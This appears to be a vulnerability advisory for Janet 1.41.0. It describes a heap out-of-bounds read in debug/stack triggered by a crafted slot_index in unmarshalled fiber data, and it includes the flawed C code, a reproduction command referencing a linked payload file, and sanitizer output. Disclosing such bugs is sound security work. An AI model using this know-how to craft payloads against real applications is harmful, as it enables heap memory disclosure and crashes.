## CVE-2026-10267: Heap OOB read in debug/stack via crafted symbolmap slot_index in unmarshalled fiber

debug.c:353 reads stack[jsm.slot_index] without bounds checking against
def->slotcount. The symbolmap is populated from attacker-controlled marshal
data (marsh.c:985: slot_index = readint()), with no validation that
slot_index < slotcount. When debug/stack inspects a fiber containing a
crafted function definition, the unchecked index reads past the stack frame
allocation into adjacent heap memory.

- Version: 1.41.0 (commit 5b5844b4)

Root cause (debug.c):
  ```c
    /* line 353 — slot_index from symbolmap used without bounds check */
    } else if (pc >= jsm.birth_pc && pc < jsm.death_pc) {
        value = stack[jsm.slot_index];    /* OOB if slot_index >= slotcount */
    }

    /* marsh.c:985 — slot_index read from untrusted serialized data */
    def->symbolmap[i].slot_index = (uint32_t) readint(st, &data);
    /* No validation: slot_index could be any uint32_t value */
  ```


### Proof-of-Concept

Crafted marshal payload: [poc_debug_oob_read.bin]()
- Build with sanitizers

Run:
  ```bash
    ./build/janet -e '(debug/stack (unmarshal (slurp "poc_debug_oob_read.bin") load-image-dict))'
  ```

### Sanitizer output:

$ ./build/janet -e '(debug/stack (unmarshal (slurp "poc_debug_oob_read.bin") load-image-dict))' 2>&1
```bash
=================================================================
==211255==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xee02db5e6320 at pc 0xbc917b3493ac bp 0xffffe41d5870 sp 0xffffe41d5860
READ of size 8 at 0xee02db5e6320 thread T0
    #0 0xbc917b3493a8 in doframe src/core/debug.c:353
    #1 0xbc917b3493a8 in cfun_debug_stack src/core/debug.c:386
    #2 0xbc917b37f068 in run_vm src/core/vm.c:1061
    #3 0xbc917b370f10 in janet_continue_no_check src/core/vm.c:1579
    #4 0xbc917b3a65b8 in janet_loop1 src/core/ev.c:1541
    #5 0xbc917b3a737c in janet_loop src/core/ev.c:1611
    #6 0xbc917b3a82d0 in janet_loop_fiber src/core/run.c:150
    #7 0xbc917b273928 in main build/c/shell.c:1284
    #8 0xf112dc752598 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #9 0xf112dc752678 in __libc_start_main_impl ../csu/libc-start.c:360
    #10 0xbc917b273b2c in _start (/home/roo/Desktop/janet/janet/build/janet+0x1c3b2c) (BuildId: 94f3bed52d07fc633f5ab2d3fcd238febe1895e4)

0xee02db5e6320 is located 664 bytes after 168-byte region [0xee02db5e5fe0,0xee02db5e6088)
allocated by thread T0 here:
    #0 0xf112dd16a578 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
    #1 0xbc917b35e548 in unmarshal_one_fiber src/core/marsh.c:1115
    #2 0xbc917b35e548 in unmarshal_one src/core/marsh.c:1409
    #3 0xbc917b36abdc in janet_unmarshal src/core/marsh.c:1649
    #4 0xbc917b37f068 in run_vm src/core/vm.c:1061
    #5 0xbc917b370f10 in janet_continue_no_check src/core/vm.c:1579
    #6 0xbc917b3a65b8 in janet_loop1 src/core/ev.c:1541
    #7 0xbc917b3a737c in janet_loop src/core/ev.c:1611
    #8 0xbc917b3a82d0 in janet_loop_fiber src/core/run.c:150
    #9 0xbc917b273928 in main build/c/shell.c:1284
    #10 0xf112dc752598 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #11 0xf112dc752678 in __libc_start_main_impl ../csu/libc-start.c:360
    #12 0xbc917b273b2c in _start (/home/roo/Desktop/janet/janet/build/janet+0x1c3b2c) (BuildId: 94f3bed52d07fc633f5ab2d3fcd238febe1895e4)

SUMMARY: AddressSanitizer: heap-buffer-overflow src/core/debug.c:353 in doframe
Shadow bytes around the buggy address:
  0xee02db5e6080: 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0xee02db5e6300: fa fa fa fa[fa]fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xee02db5e6580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==211255==ABORTING
```

Impact:
  - Information disclosure — reads arbitrary heap memory adjacent to the
    fiber's stack allocation; the read value is returned in the debug/stack
    result table under the :locals key
  - DoS — may crash if reading unmapped memory
  - Reachable from any application that unmarshals untrusted data AND
    inspects the resulting fiber via debug/stack (e.g., error handlers)

